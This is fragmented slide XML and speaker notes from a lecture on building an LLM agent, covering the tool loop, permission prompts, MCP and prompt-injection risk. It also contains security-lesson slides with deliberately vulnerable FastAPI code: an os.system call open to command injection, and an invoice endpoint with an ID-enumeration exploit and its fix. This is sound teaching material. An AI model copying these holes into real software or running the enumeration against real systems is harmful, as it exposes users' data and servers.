          <p:cNvPr id="337" name="Google Shape;337;g3ec891ba402_0_4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ec891ba402_0_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g3ec891ba402_0_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hammer: tools aren't 'how the model does things,' tools are 'what you've authorized to happen on the model's behalf.' That's a security framing, not a capability one. The Claude Code analogy is worth drawing out - it has tools like read, write, bash, but it ALSO has a permission system that asks the user before it runs the destructive ones. That permission prompt isn't friction, it's the design choice that makes a really powerful tool safe to hand to people. For the final project, anyone wiring an agent into their app should think hard about what tools they're exposing and what the worst case actually looks like.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="344" name="Google Shape;344;g3ec891ba402_0_5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ec891ba402_0_5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0" name="Google Shape;350;g3ec891ba402_0_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hammer: tools aren't 'how the model does things,' tools are 'what you've authorized to happen on the model's behalf.' That's a security framing, not a capability one. The Claude Code analogy is worth drawing out - it has tools like read, write, bash, but it ALSO has a permission system that asks the user before it runs the destructive ones. That permission prompt isn't friction, it's the design choice that makes a really powerful tool safe to hand to people. For the final project, anyone wiring an agent into their app should think hard about what tools they're exposing and what the worst case actually looks like.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="351" name="Google Shape;351;g3ec891ba402_0_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ec891ba402_0_6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g3ec891ba402_0_6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hammer: tools aren't 'how the model does things,' tools are 'what you've authorized to happen on the model's behalf.' That's a security framing, not a capability one. The Claude Code analogy is worth drawing out - it has tools like read, write, bash, but it ALSO has a permission system that asks the user before it runs the destructive ones. That permission prompt isn't friction, it's the design choice that makes a really powerful tool safe to hand to people. For the final project, anyone wiring an agent into their app should think hard about what tools they're exposing and what the worst case actually looks like.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="358" name="Google Shape;358;g3ec891ba402_0_6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framing to hammer: tools aren't 'how the model does things,' tools are 'what you've authorized to happen on the model's behalf.' That's a security framing, not a capability one. The Claude Code analogy is worth drawing out - it has tools like read, write, bash, but it ALSO has a permission system that asks the user before it runs the destructive ones. That permission prompt isn't friction, it's the design choice that makes a really powerful tool safe to hand to people. For the final project, anyone wiring an agent into their app should think hard about what tools they're exposing and what the worst case actually looks like.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="365" name="Google Shape;365;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Live coding section. The previous sections laid out every piece, now we wire them together. The whole agent is deliberately small (about 30 lines) so it fits on one slide and students can take it home.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="372" name="Google Shape;372;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first half. Imports, client, the two tool functions, the name-&gt;function dispatch </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dict</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, the tool schemas (the [...] is the same JSON from the 'defining a tool' slide, one entry per function), and the initial messages list seeded with the user's first input. None of this is actually agent-specific yet, it's all just plumbing. The loop is the next slide.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="378" name="Google Shape;378;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loop, end to end. Call the model with the current messages and tools, append the response. If the model didn't ask for a tool, print its text answer and we're done. Otherwise run every tool it asked for (the list comprehension handles the model requesting several tools in one turn, which does happen, and the SDK supports it out of the box) and append the results as one user-role </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_result</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> block, then loop. Twelve or so lines. And it's not a toy - point the TOOLS list at the right functions and this same code will read your codebase, run your tests, edit files, grep, whatever you've given it functions for. The two slides together are smaller than one React component.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="387" name="Google Shape;387;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Run this live if at all possible. The visceral moment is watching the agent call tools, get answers, decide on the next call, and converge on the answer - ideally with a running printout showing each tool call as it happens. If the live demo is risky, fall back to a pre-recorded transcript and walk it line by line. Either way, the point is the same: the agent isn't doing anything you couldn't trace by hand, and it definitely isn't doing anything you don't have the code for.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="396" name="Google Shape;396;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ec891ba402_1_5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2" name="Google Shape;402;g3ec891ba402_1_5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It's a new attack surface but it rhymes perfectly with the 27-year-old SQL injection lesson: don't let attacker-controlled strings become part of your program's control flow. For SQL the structural part was the query; for an agent the structural part is its instructions. Same shape. The 'in English, against an LLM' line is the one I want students to remember - it reframes a scary-feeling new attack as an old one in a new outfit.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="403" name="Google Shape;403;g3ec891ba402_1_5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ec891ba402_1_4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g3ec891ba402_1_4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It's a new attack surface but it rhymes perfectly with the 27-year-old SQL injection lesson: don't let attacker-controlled strings become part of your program's control flow. For SQL the structural part was the query; for an agent the structural part is its instructions. Same shape. The 'in English, against an LLM' line is the one I want students to remember - it reframes a scary-feeling new attack as an old one in a new outfit.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="410" name="Google Shape;410;g3ec891ba402_1_44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ec891ba402_1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g3ec891ba402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pivot. So far you've owned everything - the loop AND the tools. This section breaks them apart: most of the time the tools you want already exist, and a lot of the time you're not even the one running the loop. MCP is the standard that makes both of those work.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Say you wired an agent into your final project. What tools would it actually need?</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="417" name="Google Shape;417;g3ec891ba402_1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ec891ba402_1_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2" name="Google Shape;422;g3ec891ba402_1_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MCP is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Anthropic's</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> protocol, published late 2024, and it's been broadly adopted since - it's how Claude Desktop, Cursor, and a lot of others load tools now. Don't oversell it as magic: it's literally a JSON-RPC convention for 'here are my tools' and 'please run this one.' The conceptual move is just decoupling - the loop and the tools were welded together in our 30-line agent, and MCP splits them across a process boundary so they can be written by different people. Keep hammering that the round-trip is unchanged; only the source of the tools moved.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="423" name="Google Shape;423;g3ec891ba402_1_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ec891ba402_1_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g3ec891ba402_1_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The answer: it's a tool definition - the exact name / description / </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>input_schema</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> shape from the 'defining a tool' slide back in the tools section. That's the whole trick. An MCP server describes its tools in the same format you'd write by hand, so when your agent asks 'what have you got?', what comes back drops straight into the tools list you already know how to use. Nothing new to learn on the schema side - that's the payoff of a standard.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="430" name="Google Shape;430;g3ec891ba402_1_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ec891ba402_1_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8" name="Google Shape;438;g3ec891ba402_1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the two key calls. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>list_tools</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() is step 1 of the round-trip - except you didn't write the tools, the server handed them over. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>call_tool</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>() is step 3 - except the code that actually runs isn't yours either, it's the server's. Everything in between (the model choosing a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tool_use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, you appending the result) is identical to the agent we just built. Don't get lost in the async/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stdio</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> plumbing; the point is the two arrows: tools come FROM the server, execution goes TO the server. That's MCP.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="439" name="Google Shape;439;g3ec891ba402_1_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ec891ba402_1_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7" name="Google Shape;447;g3ec891ba402_1_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expose direction is the one that reframes things, so spend the time here. All semester an app meant a server with a UI a human clicks. MCP says your app can also be a set of capabilities an AGENT drives, with no front end at all. The final-project hook is concrete: a team whose app posts messages could expose a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>post_message</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> tool and run it from Claude Desktop in front of the class. Don't require it - just plant it as a strong option for anyone who finishes early and wants a memorable demo.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="448" name="Google Shape;448;g3ec891ba402_1_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ec891ba402_1_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g3ec891ba402_1_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Tie the bow back to the tools section and to 9.2. An MCP server is a dependency with teeth: it's code you didn't write, running tools on your behalf, frequently with access to your files or network. The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>npm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-install analogy lands because they just lived through supply-chain framing in 9.2 (the committed-secret and dependency stories). Same instinct applies: vet what you pull in. And it compounds with prompt injection - every server widens the set of actions an injected instruction could trigger. Not a reason to avoid MCP, just the lens to use when you add one.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="455" name="Google Shape;455;g3ec891ba402_1_4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closer. Connect what students just built to what they've been using all semester, name the levers that scale a toy agent into a real one, and hand off to 10.2.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462" name="Google Shape;462;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7" name="Google Shape;467;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Drive it home: the production agents really aren't a different category of thing, they're this same loop with more tools, better tools, sharper prompting, and a nice UX wrapped around it. That's the whole difference. Anyone who sat through the 'agent in 30 lines' slide can now open a Cursor or Claude Code transcript and follow exactly what's happening on each turn, which is the whole point of today.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468" name="Google Shape;468;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ec891ba402_1_20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g3ec891ba402_1_20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are the things that turn a 30-line toy into a real production agent. Tool selection is mostly a prompting problem - write better descriptions, group related tools, sometimes run a separate model to pre-filter the list down. Context length is where prompt caching and conversation summarization come in; the Claude API supports both and Claude Code uses both. Error recovery is mostly about feeding tool errors back to the model in a structured way and letting it react. Worth naming each one, not worth going deep on any of them.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="475" name="Google Shape;475;g3ec891ba402_1_20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ec891ba402_1_2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g3ec891ba402_1_2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are the things that turn a 30-line toy into a real production agent. Tool selection is mostly a prompting problem - write better descriptions, group related tools, sometimes run a separate model to pre-filter the list down. Context length is where prompt caching and conversation summarization come in; the Claude API supports both and Claude Code uses both. Error recovery is mostly about feeding tool errors back to the model in a structured way and letting it react. Worth naming each one, not worth going deep on any of them.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="483" name="Google Shape;483;g3ec891ba402_1_2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0" name="Google Shape;490;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These are the things that turn a 30-line toy into a real production agent. Tool selection is mostly a prompting problem - write better descriptions, group related tools, sometimes run a separate model to pre-filter the list down. Context length is where prompt caching and conversation summarization come in; the Claude API supports both and Claude Code uses both. Error recovery is mostly about feeding tool errors back to the model in a structured way and letting it react. Worth naming each one, not worth going deep on any of them.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="491" name="Google Shape;491;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8" name="Google Shape;498;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Three-point recap, then the handoff to demo day. By 10.2 the final projects are due and every team is presenting. The course-tour second half is a deliberate pull-back from 'here's how to do X' to 'here's where what we did fits into the bigger landscape,' which is a nice place to land a survey course.</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="499" name="Google Shape;499;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7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="pic" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1792288" y="612775"/>
            <a:ext cx="5486400" cy="4114800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="Google Shape;64;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10.1</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Building an Agent</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g3ec891ba402_1_246"/>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 the thumbnail maker</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="Google Shape;95;g3ec891ba402_1_246"/>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96" name="Google Shape;96;g3ec891ba402_1_246"/>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g3ec891ba402_1_246"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="1645920"/>
            <a:ext cx="10179900" cy="388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333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># Generate a thumbnail by shelling out to ImageMagick's convert.</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Takes an uploaded file's name, runs convert on it.</a:t>
            </a:r>
            <a:endParaRPr sz="16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@app.post("/thumbnail")</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def make_thumbnail(</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filename: str,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>user: User = Depends(current_user),</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output = filename.replace(".png", "_thumb.png")</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os.system(f"convert uploads/{filename} -resize 100x100 uploads/{output}")</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return {"thumbnail": output}</a:t>
            </a:r>
            <a:endParaRPr sz="1700"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="16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6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Normal input: filename = "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>dachshund</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>.png"</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-&gt; convert uploads/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>dachshund</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>.png -resize 100x100 uploads/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>dachshund</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>_thumb.png</a:t>
            </a:r>
            <a:endParaRPr sz="1700"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>#   -&gt; works fine</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
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Google Shape;103;g3ec891ba402_1_32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a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="Google Shape;104;g3ec891ba402_1_329"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9601200" y="1188720"/>
            <a:ext cx="1828800" cy="5232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 (FastAPI)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="Google Shape;105;g3ec891ba402_1_329"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731525" y="1188725"/>
            <a:ext cx="10728600" cy="51318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g3ec891ba402_1_329"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005865" y="1342495"/>
            <a:ext cx="10179900" cy="55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333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># Multi-tenant app. Each org has invoices. You must be a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>member of an org to view its invoices.</a:t>
            </a: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@app.get("/orgs/{org_id}/invoices/{invoice_id}")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get_invoice(org_id: int,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>invoice_id: int,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>user: User = Depends(current_user)):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with engine.begin() as conn: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member = conn.execute(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text("""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SELECT 1 FROM memberships</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WHERE org_id = :org AND user_id = :uid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{"org": org_id, "uid": user.id},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).first()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member is None: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HTTPException(403)        # not in this org</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invoice = conn.execute(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text("SELECT * FROM invoices WHERE id = :id"),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{"id": invoice_id},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).first()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invoice is None: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HTTPException(404)</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dict(invoice._mapping)</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2" name="Google Shape;112;g3ec891ba402_1_337"/>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 #4: the exploit and the fix</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="113" name="Google Shape;113;g3ec891ba402_1_337"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9601200" y="1188720"/>
            <a:ext cx="1828800" cy="5232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 (FastAPI)</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="114" name="Google Shape;114;g3ec891ba402_1_337"/>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g3ec891ba402_1_337"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1005840" y="1645920"/>
            <a:ext cx="10179900" cy="521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THE EXPLOIT: you're a member of org 5 (legitimately).</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GET /orgs/5/invoices/1</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GET /orgs/5/invoices/2</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GET /orgs/5/invoices/3   ...</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invoice_id isn't scoped to the org, so you walk every </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>invoice in the database</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>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THE FIX: tie the item to the container in the query.</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invoice = conn.execute(</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text("""</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SELECT * FROM invoices</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WHERE id = :id AND org_id = :org</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{"id": invoice_id, "org": org_id},</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).first()</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if invoice is None:</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raise HTTPException(404)</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>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return dict(invoice._mapping)</a:t>
            </a:r>
            <a:endParaRPr sz="1600"/>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20"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="121" name="Google Shape;121;p2"/>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What’s inside the Claude Code box?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sp>
        <p:nvSpPr>
          <p:cNvPr id="127" name="Google Shape;127;g3ec891ba402_1_22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agent is a loop around an LLM, with tools</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="128" name="Google Shape;128;g3ec891ba402_1_220"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="235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J</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ust two pieces, and both of them are small:</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The loop.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> You call the model, get a response back, decide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to do next, and call it again. The model itself has no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memory - YOU carry the conversation across calls, in a list.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="6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g3ec891ba402_1_2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agent is a loop around an LLM, with tools</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="135" name="Google Shape;135;g3ec891ba402_1_226"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1463040"/>
            <a:ext cx="10362900" cy="427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J</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="333344"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ust two pieces, and both of them are small:</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The loop.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> You call the model, get a response back, decide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to do next, and call it again. The model itself has no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memory - YOU carry the conversation across calls, in a list.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The tools.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="666677"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> Functions you let the model invoke - reading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file, running a command, querying a database. The model picks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it wants to call, you actually run it, and you hand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result back.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" marR="0" lvl="1" indent="0" algn="l" rtl="0">
              <a:spcBef>
                <a:spcPts val="6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p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agent is a loop around an LLM, with tools</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="142" name="Google Shape;142;p4"/>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J</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" i="0" u="none" strike="noStrike" cap="none">
